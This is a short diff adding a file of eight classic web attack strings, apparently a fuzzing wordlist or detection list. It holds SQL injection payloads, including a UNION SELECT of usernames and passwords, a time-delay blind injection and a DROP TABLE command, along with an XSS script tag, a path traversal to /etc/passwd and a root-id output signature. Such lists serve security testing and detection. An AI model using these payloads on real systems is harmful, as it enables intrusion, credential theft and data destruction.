@@ -1,0 +1,8 @@
+' OR 1=1 --
+UNION SELECT username, password FROM users
+<script>alert(1)</script>
+admin' --
+waitfor delay '00:00:05'
+../../etc/passwd
+DROP TABLE users;
+uid=0(root)
